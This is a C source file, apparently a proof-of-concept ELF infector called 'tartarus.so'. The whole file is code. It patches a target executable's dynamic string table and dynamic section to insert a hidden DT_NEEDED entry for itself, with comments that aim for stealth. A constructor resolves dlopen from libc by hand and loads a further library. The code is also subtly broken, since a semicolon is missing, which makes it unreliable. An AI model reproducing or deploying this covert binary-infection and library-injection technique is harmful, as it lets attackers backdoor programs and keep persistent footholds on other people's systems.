#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <elf.h>
#include <stdint.h>
#include <errno.h>
#include <time.h>

#define lib "./test.so"
#define self "tartarus.so"
#define target "./tmp"

const char interp[] __attribute__((section(".interp"))) = "/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2";

void entry(){ // need to find a portable solution for parameter passing here...can get rid of the hard coded strings above if so
  int fd = open(target, O_RDWR);
  void* base = mmap(NULL, 0x300000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0); // file backed shared memory mapping so changes reflect in file
  
  Elf64_Ehdr* ehdr = (Elf64_Ehdr*)base;
  unsigned int elf_size = ehdr->e_shoff + (ehdr->e_shentsize * ehdr->e_shnum);
  
  Elf64_Shdr* shdr = (Elf64_Shdr*)(base + ehdr->e_shoff);
  
  Elf64_Shdr* shstrtab = (Elf64_Shdr*)(((ehdr->e_shstrndx * ehdr->e_shentsize) + ehdr->e_shoff) + base);
  
  char* dyn_str = NULL;
  
  char* strtab = (char*)(base + shstrtab->sh_offset);
  
  unsigned int dynstr_size = 0;
  
  Elf64_Dyn* dynamic = NULL;
  unsigned int dyn_cnt = 0;
  
  int flag = 0;
  
  // find needed sections
  for(int i = 0; i < ehdr->e_shnum && (dyn_str == NULL || dynamic == NULL); ++i){
    if(shdr->sh_type == SHT_STRTAB && !strcmp(&strtab[shdr->sh_name], ".dynstr")){
      dyn_str = (char*)ehdr + shdr->sh_offset;
      dynstr_size = shdr->sh_size;
    }else if(shdr->sh_type == SHT_DYNAMIC && !strcmp(&strtab[shdr->sh_name], ".dynamic")){
      dynamic = (Elf64_Dyn*)((char*)ehdr + shdr->sh_offset);
      dyn_cnt = shdr->sh_size / sizeof(Elf64_Dyn);
      if(shdr[1].sh_offset - shdr->sh_offset >= sizeof(Elf64_Dyn)){
	flag = 1;
      }
    }
    shdr++;
  }
  
  // replace __gmon_start__ with SO name
  char* str = dyn_str + 1; // 1st entry is null, skip over
  while(1){ // so far it seems that gcc, clang and even tcc provide the __gmon_start__ string....may suffice to only use it, TBD
    if(!strcmp(str, "__gmon_start__")){
      str[0] = '.';
      str[1] = '\0'
      // now '.' will show up in .dynsym instead of soname (maybe find even more covert string replacement?)
      strcpy(&str[2], self);
      break;
    }
    str += strlen(str) + 1;
  }

  // calculate offset for new dt_needed entry (random if more than 1 entry but bounded between first/last entry..stealthier??)
  int needed_offset = 0;
  for(int i = 0; ; ++i){
    if(dynamic[i].d_tag != DT_NEEDED){
      srand(time(0));
      needed_offset = i > 1 ? (rand() % (i - 1)) + 1 : 0;
      break;
    }
  }
  
  // for first needed entry use dynamic + 1, dynamic, dyn_cnt * sizeof(Elf64_Dyn) i.e. needed_offset = 0
  if(flag){
    // for shifting Dyn array down 1 to add new dt_needed field at the top instead of dt_debug->dt_needed
    memmove(dynamic + needed_offset + 1, dynamic + needed_offset, (dyn_cnt - needed_offset) * sizeof(Elf64_Dyn));
    dynamic[needed_offset].d_tag = DT_NEEDED;
    dynamic[needed_offset].d_un.d_val = &str[2] - dyn_str;
  }else{
    // loop through Dyn struct array to find dt_debug field converting dt_debug->dt_needed
    for(int i = 0; i < dyn_cnt; ++i){
      if(dynamic->d_tag == DT_DEBUG){
	dynamic->d_tag = DT_NEEDED;
	dynamic->d_un.d_val = &str[2] - dyn_str;
	break;
      }
      dynamic++;
    }
  }
  
  msync(base, 0x300000, MS_SYNC);
  munmap(base, 0x300000);
  
  close(fd);
  _exit(0);
}

void __attribute__((constructor)) foo(void){
  void* (*dl_open)(char*, int) = NULL;

  int pid = getpid();

  char maps[64] = { 0 };
  sprintf(maps, "/proc/%d/maps", pid);

  FILE* file = fopen(maps, "r");
  
  char* line = NULL;
  size_t len = 0;

  unsigned long long libc_base = 0;

  int fd = 0;

  // read pid proc maps to get libc base addr and full abs path
  while(1){
    getline(&line, &len, file);
    if(strstr(line, "libc") != NULL){
      int offset = strcspn(line, "-");
      line[offset++] = '\0';
      libc_base = strtoull(line, NULL, 16);
      line[strcspn(&line[offset], "\n") + offset] = '\0';
      fd = open(strstr(&line[offset], "/"), O_RDONLY);
      break;
    }
  }

  fclose(file);
  
  void* libc = mmap(NULL, 0x300000, PROT_READ, MAP_PRIVATE, fd, 0);

  close(fd);
  
  Elf64_Ehdr* ehdr = (Elf64_Ehdr*)libc;

  Elf64_Shdr* shdr = (Elf64_Shdr*)(libc + ehdr->e_shoff);

  Elf64_Shdr* shstrtab = (Elf64_Shdr*)(((ehdr->e_shstrndx * ehdr->e_shentsize) + ehdr->e_shoff) + libc);
  
  Elf64_Sym* dyn_sym = NULL;
  
  int sym_cnt = 0;

  char* dyn_str = NULL;

  char* strtab = (char*)(libc + shstrtab->sh_offset);

  uint32_t* hashtab = NULL;

  // collect all sections needed for resolution of dynamic symbol locations in libc
  for(int i = 0; i < ehdr->e_shnum && (dyn_sym == NULL || dyn_str == NULL || hashtab == NULL); ++i){
    if(shdr->sh_type == SHT_DYNSYM && !strcmp(&strtab[shdr->sh_name], ".dynsym")){
      dyn_sym = (Elf64_Sym*)((char*)ehdr + shdr->sh_offset);
      sym_cnt = shdr->sh_size / sizeof(Elf64_Sym);
    }else if(shdr->sh_type == SHT_STRTAB && !strcmp(&strtab[shdr->sh_name], ".dynstr")){
      dyn_str = (char*)ehdr + shdr->sh_offset;
    }else if(shdr->sh_type == SHT_HASH && !strcmp(&strtab[shdr->sh_name], ".hash")){
      hashtab = (uint32_t*)((char*)ehdr + shdr->sh_offset);
    }
    shdr++;
  }

  // if hash table found (should always??) then look up symbols via hash table
  if(hashtab != NULL){
    char* sym_name = "dlopen";
    uint32_t hash = 0, tmp;

    // hash the symbol name
    for(int i = 0; sym_name[i]; ++i){
      hash = (hash << 4) + sym_name[i];
      if((tmp = hash & 0xf0000000)){
	hash ^= tmp | (tmp >> 24);
      }
    }

    uint32_t nbucket = hashtab[0];
    uint32_t* bucket = &hashtab[2];
    uint32_t* chain = &bucket[nbucket];

    //traverse the bucket chains to find symbol
    for(uint32_t i = bucket[hash % nbucket]; i; i = chain[i]){
      if(!strcmp(&dyn_str[dyn_sym[i].st_name], sym_name)){
	dl_open = (void* (*)(char*, int))(dyn_sym[i].st_value + libc_base);
	break;
      }
    }

  }

  // as fall back, allow linear symbol search
  if(dl_open == NULL){
    for(int i = 0; i < sym_cnt; ++i){
      if(dyn_sym->st_name != 0 && !strcmp(&dyn_str[dyn_sym->st_name], "dlopen")){
	dl_open = (void* (*)(char*, int))(dyn_sym->st_value + libc_base);
	break;
      }
      dyn_sym++;
    }
  }
  
  munmap(libc, 0x300000);
  
  // finally the fruits of labor, call the function
  dl_open(lib, RTLD_LAZY);
}
